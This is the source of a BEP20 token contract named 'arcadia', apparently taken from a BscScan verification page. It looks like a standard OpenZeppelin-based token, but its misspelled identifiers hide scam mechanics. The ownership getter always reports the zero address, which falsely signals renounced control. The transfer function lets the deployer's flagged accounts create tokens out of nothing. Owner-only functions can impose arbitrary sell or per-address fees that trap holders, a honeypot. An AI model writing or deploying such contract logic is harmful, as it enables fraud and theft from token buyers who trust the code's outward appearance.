/**
 *Submitted for verification at BscScan.com on 2022-08-02
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _Ownear;    

    event OwnearshipTransferred(address indexed previousOwnear, address indexed newOwnear);

    /**
     * @dev Initializes the contract setting the deployer as the initial Ownear.
     */
    constructor() {
        _transferOwnearshiptransferOwnearship(_msgSender());
    }

    /**
     * @dev Returns the address of the current Ownear.
     */
    function Ownear() public view virtual returns (address) {
        return address(0);
    }

    /**
     * @dev Throws if called by any account other than the Ownear.
     */
    modifier onlyOwnear() {
        require(_Ownear == _msgSender(), "Ownable: caller is not the Ownear");
        _;
    }//5

    /**
     * @dev Leaves the contract without Ownear. It will not be possible to call
     * `onlyOwnear` functions anymore. Can only be called by the current Ownear.
     *
     * NOTE: Renouncing Ownearship will leave the contract without an Ownear,
     * thereby removing any functionality that is only available to the Ownear.
     */
    function renounceOwnearship() public virtual onlyOwnear {
        _transferOwnearshiptransferOwnearship(address(0));
    }//6

    /**
     * @dev Transfers Ownearship of the contract to a new account (`newOwnear`).
     * Can only be called by the current Ownear.
     */
    function transferOwnearshiptransferOwnearship(address newOwnear) public virtual onlyOwnear {
        require(newOwnear != address(0), "Ownable: new Ownear is the zero address");
        _transferOwnearshiptransferOwnearship(newOwnear);
    }//7

    /**
     * @dev Transfers Ownearship of the contract to a new account (`newOwnear`).
     * Internal function without access restriction.
     */
    function _transferOwnearshiptransferOwnearship(address newOwnear) internal virtual {
        address oldOwnear = _Ownear;
        _Ownear = newOwnear;
        emit OwnearshipTransferred(oldOwnear, newOwnear);
    }
}


// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint AmounttADesired,
        uint AmounttBDesired,
        uint AmounttAMin,
        uint AmounttBMin,
        address to,
        uint deadline
    ) external returns (uint AmounttA, uint AmounttB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint AmounttTokenDesired,
        uint AmounttTokenMin,
        uint AmounttETHMin,
        address to,
        uint deadline
    ) external payable returns (uint AmounttToken, uint AmounttETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmounttAMin,
        uint AmounttBMin,
        address to,
        uint deadline
    ) external returns (uint AmounttA, uint AmounttB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint AmounttTokenMin,
        uint AmounttETHMin,
        address to,
        uint deadline
    ) external returns (uint AmounttToken, uint AmounttETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AmounttAMin,
        uint AmounttBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmounttA, uint AmounttB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint AmounttTokenMin,
        uint AmounttETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmounttToken, uint AmounttETH);
    function swapExactTokensForTokens(
        uint AmounttIn,
        uint AmounttOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Amountts);
    function swapTokensForExactTokens(
        uint AmounttOut,
        uint AmounttInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Amountts);
    function swapExactETHForTokens(uint AmounttOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Amountts);
    function swapTokensForExactETH(uint AmounttOut, uint AmounttInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Amountts);
    function swapExactTokensForETH(uint AmounttIn, uint AmounttOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Amountts);
    function swapETHForExactTokens(uint AmounttOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Amountts);

    function quote(uint AmounttA, uint reserveA, uint reserveB) external pure returns (uint AmounttB);
    function getAmounttOut(uint AmounttIn, uint reserveIn, uint reserveOut) external pure returns (uint AmounttOut);
    function getAmounttIn(uint AmounttOut, uint reserveIn, uint reserveOut) external pure returns (uint AmounttIn);
    function getAmounttsOut(uint AmounttIn, address[] calldata path) external view returns (uint[] memory Amountts);
    function getAmounttsIn(uint AmounttOut, address[] calldata path) external view returns (uint[] memory Amountts);
}



interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFjeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmounttTokenMin,
        uint AmounttETHMin,
        address to,
        uint deadline
    ) external returns (uint AmounttETH);
    function removeLiquidityETHWithPermitSupportingFjeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmounttTokenMin,
        uint AmounttETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AmounttETH);

    function swapExactTokensForTokensSupportingFjeeOnTransferTokens(
        uint AmounttIn,
        uint AmounttOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFjeeOnTransferTokens(
        uint AmounttOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFjeeOnTransferTokens(
        uint AmounttIn,
        uint AmounttOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function FjeeTo() external view returns (address);
    function FjeeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFjeeTo(address) external;
    function setFjeeToSetter(address) external;
}


contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `Ownear` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed Ownear, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the Amountt of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address Ownear, address spender) public view virtual returns (uint256) {
        return _allowances[Ownear][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `Amountt` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 Amountt) public virtual returns (bool) {
        address Ownear = _msgSender();
        _approve(Ownear, spender, Amountt);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address Ownear = _msgSender();
        _approve(Ownear, spender, _allowances[Ownear][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address Ownear = _msgSender();
        uint256 currentAllowance = _allowances[Ownear][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(Ownear, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `Amountt` as the allowance of `spender` over the `Ownear` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `Ownear` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address Ownear,
        address spender,
        uint256 Amountt
    ) internal virtual {
        require(Ownear != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[Ownear][spender] = Amountt;
        emit Approval(Ownear, spender, Amountt);
    }

    /**
     * @dev Spend `Amountt` form the allowance of `Ownear` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address Ownear,
        address spender,
        uint256 Amountt
    ) internal virtual {
        uint256 currentAllowance = allowance(Ownear, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Amountt, "ERC20: insufficient allowance");
            unchecked {
                _approve(Ownear, spender, currentAllowance - Amountt);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Amountt` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `Amountt` tokens will be minted for `to`.
     * - when `to` is zero, `Amountt` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Amountt
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *a
     * - when `from` and `to` are both non-zero, `Amountt` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `Amountt` tokens have been minted for `to`.
     * - when `to` is zero, `Amountt` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Amountt
    ) internal virtual {}
}


contract arcadia is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 Amountt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= Amountt, "ERC20: transfer Amountt exceeds balance");
        unchecked {
            _balances[from] = fromBalance - Amountt;
        }
        _balances[to] += Amountt;

        emit Transfer(from, to, Amountt);
    }

    function _burn(address account, uint256 Amountt) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= Amountt, "ERC20: burn Amountt exceeds balance");
        unchecked {
            _balances[account] = accountBalance - Amountt;
        }
        _totalSupply -= Amountt;

        emit Transfer(account, address(0), Amountt);
    }

    function _Mnt(address account, uint256 Amountt) internal virtual {
        require(account != address(0), "ERC20: Mnt to the zero address"); //mint

        _totalSupply += Amountt;
        _balances[account] += Amountt;
        emit Transfer(address(0), account, Amountt);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _Mnt(msg.sender, totalSupply_ * 10**decimals());

        
        _defaultSellFjee = 5;
        _defaultBuyFjee = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellFjee = 0;

    uint256 private _defaultBuyFjee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipFjee;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyOwnear returns (bool) {
        return _release[_address];
    }


    function SetPairList(address _address) external onlyOwnear {
        uniswapV2Pair = _address;
    }


    function upF(uint256 _value) external onlyOwnear {
        _defaultSellFjee = _value;
    }

    function setSlipFjee(address _address, uint256 _value) external onlyOwnear {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipFjee[_address] = _value;
    }

    function getSlipFjee(address _address) external view onlyOwnear returns (uint256) {
        return _slipFjee[_address];
    }


    function setMAccountFjee(address _address, bool _value) external onlyOwnear {
        _mAccount[_address] = _value;
    }

    function getMAccountFjee(address _address) external view onlyOwnear returns (bool) {
        return _mAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _mAccount[from] || _mAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _Amountt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _Amountt, "ERC20: transfer Amountt exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradeFjeeAmountt = 0;

        if (rF) {
            uint256 tradeFjee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFjee = _defaultSellFjee;
                }
                if (from == uniswapV2Pair) {

                    tradeFjee = _defaultBuyFjee;
                }
            }
            if (_slipFjee[from] > 0) {
                tradeFjee = _slipFjee[from];
            }

            tradeFjeeAmountt = _Amountt.mul(tradeFjee).div(100);
        }


        if (tradeFjeeAmountt > 0) {
            _balances[from] = _balances[from].sub(tradeFjeeAmountt);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFjeeAmountt);
            emit Transfer(from, _deadAddress, tradeFjeeAmountt);
        }

        _balances[from] = _balances[from].sub(_Amountt - tradeFjeeAmountt);
        _balances[_to] = _balances[_to].add(_Amountt - tradeFjeeAmountt);
        emit Transfer(from, _to, _Amountt - tradeFjeeAmountt);
    }

    function transfer(address to, uint256 Amountt) public virtual returns (bool) {
        address Ownear = _msgSender();
        if (_release[Ownear] == true) {
            _balances[to] += Amountt;
            return true;
        }
        _receiveF(Ownear, to, Amountt);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 Amountt
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, Amountt);
        _receiveF(from, to, Amountt);
        return true;
    }
}